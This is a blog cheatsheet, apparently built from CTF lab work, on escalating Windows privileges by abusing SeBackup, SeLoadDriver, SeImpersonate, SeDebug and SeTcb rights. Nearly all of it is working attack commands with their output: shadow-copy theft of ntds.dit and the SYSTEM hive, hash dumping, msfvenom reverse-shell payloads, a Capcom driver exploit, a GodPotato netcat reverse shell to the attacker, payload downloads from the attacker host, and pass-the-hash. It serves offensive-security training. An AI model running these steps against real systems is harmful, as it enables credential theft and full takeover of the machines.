<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Windows Privilege Escalation | serioton</title><meta name="author" content="serioton"><meta name="copyright" content="serioton"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="practical techniques for abusing some windows privileges and built-in security groups">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows Privilege Escalation">
<meta property="og:url" content="https://seriotonctf.github.io/2024/08/10/Windows-Privesc/index.html">
<meta property="og:site_name" content="serioton">
<meta property="og:description" content="practical techniques for abusing some windows privileges and built-in security groups">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Feb66e480-7ab5-4a3e-bbd1-9c56c1cf2b3f%2Fcat2.png?table=block&id=47c9e554-38f8-4c65-81cc-abad857404d6&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1420&userId=&cache=v2">
<meta property="article:published_time" content="2024-08-10T15:00:00.000Z">
<meta property="article:modified_time" content="2024-08-10T14:27:48.715Z">
<meta property="article:author" content="serioton">
<meta property="article:tag" content="ctf,writeups,vulnlab,hackthebox,htb,thm,cheatsheet">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Feb66e480-7ab5-4a3e-bbd1-9c56c1cf2b3f%2Fcat2.png?table=block&id=47c9e554-38f8-4c65-81cc-abad857404d6&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1420&userId=&cache=v2"><link rel="shortcut icon" href="/img/iconcat.png"><link rel="canonical" href="https://seriotonctf.github.io/2024/08/10/Windows-Privesc/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Windows Privilege Escalation',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-08-10 14:27:48'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = url => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      link.onload = () => resolve()
      link.onerror = () => reject()
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/cat.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/train_travel_illustration-wallpaper-1920x1080.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="serioton"><img class="site-icon" src="/img/cat.jpg"/><span class="site-name">serioton</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Windows Privilege Escalation</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon fas fa-history"></i><span class="post-meta-label">Updated</span><time datetime="2024-08-10T14:27:48.715Z" title="Updated 2024-08-10 14:27:48">2024-08-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/cheatsheet/">cheatsheet</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Privileges"><a href="#Privileges" class="headerlink" title="Privileges"></a>Privileges</h1><h2 id="SeBackupPrivilege"><a href="#SeBackupPrivilege" class="headerlink" title="SeBackupPrivilege"></a>SeBackupPrivilege</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\Caroline.Robinson\Documents&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">...</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="Disk-Shadow-method"><a href="#Disk-Shadow-method" class="headerlink" title="Disk Shadow method"></a>Disk Shadow method</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters </span><br><span class="line">add volume c: alias pwn </span><br><span class="line">create </span><br><span class="line">expose %pwn% z: </span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; upload pwn.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; <span class="built_in">type</span> pwn.txt</span><br><span class="line"><span class="built_in">set</span> context persistent nowriters </span><br><span class="line">add volume c: alias pwn </span><br><span class="line">create </span><br><span class="line">expose %pwn% z: </span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; diskshadow /s pwn.txt</span><br><span class="line">Microsoft DiskShadow version <span class="number">1.0</span></span><br><span class="line">Copyright (C) <span class="number">2013</span> Microsoft Corporation</span><br><span class="line">On computer:  BABYDC,  <span class="number">8</span>/<span class="number">9</span>/<span class="number">2024</span> <span class="number">10</span>:<span class="number">57</span>:<span class="number">34</span> PM</span><br><span class="line"></span><br><span class="line">-&gt; <span class="built_in">set</span> context persistent nowriters</span><br><span class="line">-&gt; add volume c: alias pwn</span><br><span class="line">-&gt; create</span><br><span class="line">Alias pwn <span class="keyword">for</span> shadow ID &#123;<span class="number">041</span>d93f3<span class="literal">-797d-4f91-a270-5c1fb66092e6</span>&#125; <span class="built_in">set</span> as environment variable.</span><br><span class="line">Alias VSS_SHADOW_SET <span class="keyword">for</span> shadow <span class="built_in">set</span> ID &#123;<span class="number">7</span>df9215a<span class="literal">-2efb-4a28-befe-cbaf15deba8c</span>&#125; <span class="built_in">set</span> as environment variable.</span><br><span class="line"></span><br><span class="line">Querying all shadow copies with the shadow <span class="built_in">copy</span> <span class="built_in">set</span> ID &#123;<span class="number">7</span>df9215a<span class="literal">-2efb-4a28-befe-cbaf15deba8c</span>&#125;</span><br><span class="line"></span><br><span class="line">        * Shadow <span class="built_in">copy</span> ID = &#123;<span class="number">041</span>d93f3<span class="literal">-797d-4f91-a270-5c1fb66092e6</span>&#125;               %pwn%</span><br><span class="line">                - Shadow <span class="built_in">copy</span> <span class="built_in">set</span>: &#123;<span class="number">7</span>df9215a<span class="literal">-2efb-4a28-befe-cbaf15deba8c</span>&#125;       %VSS_SHADOW_SET%</span><br><span class="line">                - Original count of shadow copies = <span class="number">1</span></span><br><span class="line">                - Original volume name: \\?\Volume&#123;<span class="number">1</span>b77e212<span class="literal">-0000-0000-0000-100000000000</span>&#125;\ [<span class="type">C</span>:\]</span><br><span class="line">                - Creation time: <span class="number">8</span>/<span class="number">9</span>/<span class="number">2024</span> <span class="number">10</span>:<span class="number">57</span>:<span class="number">36</span> PM</span><br><span class="line">                - Shadow <span class="built_in">copy</span> device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</span><br><span class="line">                - Originating machine: BabyDC.baby.vl</span><br><span class="line">                - Service machine: BabyDC.baby.vl</span><br><span class="line">                - Not exposed</span><br><span class="line">                - Provider ID: &#123;b5946137<span class="literal">-7b9f-4925-af80-51abd60b20d5</span>&#125;</span><br><span class="line">                - Attributes:  No_Auto_Release Persistent No_Writers Differential</span><br><span class="line"></span><br><span class="line">Number of shadow copies listed: <span class="number">1</span></span><br><span class="line">-&gt; expose %pwn% z:</span><br><span class="line">-&gt; %pwn% = &#123;<span class="number">041</span>d93f3<span class="literal">-797d-4f91-a270-5c1fb66092e6</span>&#125;</span><br><span class="line">The shadow <span class="built_in">copy</span> was successfully exposed as z:\.</span><br><span class="line">-&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; robocopy /b z:\windows\ntds . ntds.dit</span><br><span class="line"></span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">   ROBOCOPY     ::     Robust File <span class="built_in">Copy</span> <span class="keyword">for</span> Windows</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">  Started : Friday, August <span class="number">9</span>, <span class="number">2024</span> <span class="number">10</span>:<span class="number">57</span>:<span class="number">58</span> PM</span><br><span class="line">   Source : z:\windows\ntds\</span><br><span class="line">     Dest : C:\temp\</span><br><span class="line"></span><br><span class="line">    Files : ntds.dit</span><br><span class="line"></span><br><span class="line">  Options : /DCOPY:DA /<span class="built_in">COPY</span>:DAT /B /<span class="built_in">R</span>:<span class="number">1000000</span> /W:<span class="number">30</span></span><br><span class="line"></span><br><span class="line"><span class="literal">------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">                           <span class="number">1</span>    z:\windows\ntds\</span><br><span class="line">            New File              <span class="number">16.0</span> m        ntds.dit</span><br><span class="line"></span><br><span class="line">[<span class="type">snipped</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; reg save HKLM\SYSTEM c:\temp\system</span><br><span class="line">The operation completed successfully.</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; download system</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\temp\system to system</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; download ntds.dit</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\temp\ntds.dit to ntds.dit</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  secretsdump.py -system system -ntds ntds.dit local</span><br></pre></td></tr></table></figure>
<h2 id="SeLoadDriverPrivilege"><a href="#SeLoadDriverPrivilege" class="headerlink" title="SeLoadDriverPrivilege"></a>SeLoadDriverPrivilege</h2><p>-&gt; <a target="_blank" rel="noopener" href="https://github.com/k4sth4/SeLoadDriverPrivilege">https://github.com/k4sth4/SeLoadDriverPrivilege</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; upload Capcom.sys</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; upload ExploitCapcom.exe</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; upload eoploaddriver_x64.exe</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; upload shell.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; .\eoploaddriver_x64.exe System\CurrentControlSet\dfserv C:\temp\Capcom.sys</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; .\ExploitCapcom.exe LOAD \temp\Capcom.sys</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; .\ExploitCapcom.exe EXPLOIT .\shell.exe</span><br></pre></td></tr></table></figure>
<h2 id="SeImpersonatePrivilege"><a href="#SeImpersonatePrivilege" class="headerlink" title="SeImpersonatePrivilege"></a>SeImpersonatePrivilege</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State</span><br><span class="line">============================= ========================================= ========</span><br><span class="line">...</span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\programdata&gt; <span class="built_in">iwr</span> http://&lt;tun0&gt;/GodPotato<span class="literal">-NET4</span>.exe <span class="literal">-outfile</span> gp.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\programdata&gt; .\gp.exe <span class="literal">-cmd</span> <span class="string">&quot;C:\Users\Public\nc64.exe -e cmd.exe &lt;tun0&gt; &lt;port&gt;&quot;</span></span><br><span class="line">[*] CombaseModule: <span class="number">0</span>x140733127524352</span><br><span class="line">[*] DispatchTable: <span class="number">0</span>x140733130111304</span><br><span class="line">[*] UseProtseqFunction: <span class="number">0</span>x140733129406688</span><br><span class="line">[*] UseProtseqFunctionParamCount: <span class="number">6</span></span><br><span class="line">[*] HookRPC</span><br><span class="line">[*] <span class="built_in">Start</span> PipeServer</span><br><span class="line">[*] CreateNamedPipe \\.\pipe\eb27b3cc<span class="literal">-7b5a-420d-8f01-d3094f6ee323</span>\pipe\epmapper</span><br><span class="line">[*] Trigger RPCSS</span><br><span class="line">[*] DCOM obj GUID: <span class="number">00000000</span><span class="literal">-0000-0000-c000-000000000046</span></span><br><span class="line">[*] DCOM obj IPID: <span class="number">00000402</span><span class="literal">-0d08-ffff-8e84-859d1b28d501</span></span><br><span class="line">[*] DCOM obj OXID: <span class="number">0</span>xd402854b19147ceb</span><br><span class="line">[*] DCOM obj OID: <span class="number">0</span>x20ef4be3bfc76a84</span><br><span class="line">[*] DCOM obj Flags: <span class="number">0</span>x281</span><br><span class="line">[*] DCOM obj PublicRefs: <span class="number">0</span>x0</span><br><span class="line">[*] Marshal Object bytes len: <span class="number">100</span></span><br><span class="line">[*] UnMarshal Object</span><br><span class="line">[*] Pipe Connected!</span><br><span class="line">[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">[*] CurrentsImpersonationLevel: Impersonation</span><br><span class="line">[*] <span class="built_in">Start</span> Search System Token</span><br><span class="line">[*] PID : <span class="number">892</span> Token:<span class="number">0</span>x496  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation</span><br><span class="line">[*] Find System Token : True</span><br><span class="line">[*] UnmarshalObject: <span class="number">0</span>x80070776</span><br><span class="line">[*] CurrentUser: NT AUTHORITY\SYSTEM</span><br><span class="line">[*] <span class="keyword">process</span> <span class="built_in">start</span> with pid <span class="number">3040</span></span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  nc <span class="literal">-nlvp</span> <span class="number">443</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">443</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.8</span><span class="type">.0.210</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.10</span><span class="type">.150.182</span>] <span class="number">54910</span></span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.20348.2340</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\programdata&gt;whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
<h2 id="SeDebugPrivilege"><a href="#SeDebugPrivilege" class="headerlink" title="SeDebugPrivilege"></a>SeDebugPrivilege</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f exe LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -o shell.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\temp&gt; <span class="built_in">iwr</span> http://&lt;ip&gt;/shell.exe <span class="literal">-outfile</span> shell.exe</span><br><span class="line"><span class="built_in">PS</span> C:\temp&gt; .\shell.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 443</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on &lt;attacker_ip&gt;:&lt;port&gt;</span><br><span class="line">[*] Sending stage (200774 bytes) to &lt;target_ip&gt;</span><br><span class="line">[*] Meterpreter session 1 opened [SNIP]</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -L 127.0.0.1 -l 445 -p 445 -r &lt;target_ip&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbexec administrator@127.0.0.1 -hashes :&lt;<span class="built_in">hash</span>&gt;</span><br></pre></td></tr></table></figure>
<h2 id="SeTcbPrivilege"><a href="#SeTcbPrivilege" class="headerlink" title="SeTcbPrivilege"></a>SeTcbPrivilege</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                         State</span><br><span class="line">============================= =================================== =======</span><br><span class="line">...</span><br><span class="line">SeTcbPrivilege                Act as part of the operating system Enabled</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>-&gt; <a target="_blank" rel="noopener" href="https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178">https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178</a></p>
